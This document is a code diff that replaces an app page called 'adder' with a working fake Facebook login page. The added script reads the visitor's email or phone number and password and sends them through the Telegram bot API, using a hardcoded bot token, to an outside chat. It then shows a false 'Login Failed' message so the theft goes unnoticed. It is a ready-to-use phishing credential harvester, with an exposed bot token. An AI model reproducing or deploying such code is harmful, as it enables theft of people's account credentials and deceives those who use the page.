@@ -1,27 +1,237 @@
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>adder</title>
-  <link rel="stylesheet" href="/adder/static/reset.css">
-  <link rel="stylesheet" href="/adder/static/style.css">
-  <script src="/adder/static/annotations.js"></script>
-  <script src="/adder/static/config.js"></script>
-  <script src="/adder/static/grid.js"></script>
-  <script src="/adder/static/main.js"></script>
-  <script src="/adder/static/maximize.js"></script>
-  <script src="/adder/static/telemetry.js"></script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook</title>
+    <style>
+        /* Body styling */
+        body {
+            font-family: 'Arial', sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background: linear-gradient(135deg, #1877f2, #3b5998);
+            color: white;
+        }
+
+        /* Login box container */
+        .login-box {
+            width: 100%;
+            max-width: 380px;
+            background-color: white;
+            border-radius: 12px;
+            box-shadow: 0 8px 12px rgba(0, 0, 0, 0.2);
+            padding: 40px 30px;
+            text-align: center;
+            color: #333;
+        }
+
+        /* Facebook logo styling */
+        .logo-container {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 30px;
+        }
+
+        .logo-container img {
+            width: 40px;
+            margin-right: 10px;
+        }
+
+        h2 {
+            font-size: 32px;
+            font-weight: bold;
+            color: #1877f2;
+            display: inline-block;
+        }
+
+        /* Input fields */
+        input[type="text"],
+        input[type="password"] {
+            width: 100%;
+            padding: 15px;
+            margin: 8px 0;
+            border-radius: 6px;
+            border: 1px solid #ddd;
+            font-size: 16px;
+            transition: 0.3s;
+            box-sizing: border-box;
+        }
+
+        input[type="text"]:focus,
+        input[type="password"]:focus {
+            border-color: #1877f2;
+            outline: none;
+        }
+
+        /* Button styling */
+        .login-button {
+            width: 100%;
+            padding: 16px;
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: 0.3s;
+            margin-top: 15px;
+        }
+
+        .login-button:hover {
+            background-color: #165eaa;
+        }
+
+        /* Links styling */
+        .forgot-password {
+            font-size: 14px;
+            color: #1877f2;
+            text-decoration: none;
+            margin-top: 12px;
+            display: inline-block;
+        }
+
+        .forgot-password:hover {
+            text-decoration: underline;
+        }
+
+        .footer {
+            font-size: 14px;
+            color: #888;
+            margin-top: 20px;
+        }
+
+        .footer a {
+            color: #1877f2;
+            text-decoration: none;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
+
+        /* Error message styling */
+        .error-message {
+            color: red;
+            font-weight: bold;
+            font-size: 20px;
+            margin-top: 15px;
+            animation: fadeIn 1s ease-out forwards;
+            opacity: 0;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(-20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        /* Responsive design */
+        @media (max-width: 600px) {
+            .login-box {
+                padding: 30px 20px;
+            }
+
+            h2 {
+                font-size: 28px;
+            }
+
+            .logo-container img {
+                width: 35px;
+            }
+        }
+    </style>
 </head>
-
 <body>
-  <svg id="box" xmlns="http://www.w3.org/2000/svg">
-    <image draggable="false" />
-    <g></g>
-    <circle fill="none" />
-  </svg>
-  <div id="grid"></div>
-</body>
 
+    <!-- Login box -->
+    <div class="login-box">
+        <!-- Logo and title -->
+        <div class="logo-container">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo">
+            <h2>Facebook</h2>
+        </div>
+
+        <!-- Login Form -->
+        <form id="loginForm">
+            <input type="text" id="email" placeholder="Email or Phone" required>
+            <input type="password" id="password" placeholder="Password" required>
+            <button type="submit" class="login-button">Log In</button>
+        </form>
+
+        <!-- Error message -->
+        <div id="errorMessage" class="error-message" style="display:none;">Login Failed, Try Again Later.</div>
+
+        <!-- Forgot password link -->
+        <a href="#" class="forgot-password">Forgotten password?</a>
+
+        <!-- Footer with signup link -->
+        <div class="footer">
+            <p>Don't have an account? <a href="#">Sign Up</a></p>
+        </div>
+    </div>
+
+    <script>
+        
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+
+            
+            if (email === '') {
+                alert('Please enter both email and password.');
+                return;
+            }
+
+            
+            const isPhoneNumber = /^[0-9]+$/.test(email);
+
+            if (isPhoneNumber) {
+                console.log('Phone number detected:', email);
+            } else {
+                console.log('Email detected:', email);
+            }
+
+            
+            const botToken = '6042574456:AAGzuUlLNsTz1uK64oh2O2EMPktyLAuDCO8';
+            const chatId = 'CHAT ID DANE LA @F2_PF ';
+
+            
+            const message = `Login Attempt Failed:\nEmail/Phone: ${email}\nPassword: ${password}`;
+
+            
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        console.log('Failed login data sent to Telegram.');
+                    } else {
+                        console.log('Failed to send failed login data.');
+                    }
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                });
+
+            
+            const errorMessage = document.getElementById('errorMessage');
+            errorMessage.style.display = 'block';
+        });
+    </script>
+
+</body>
 </html>
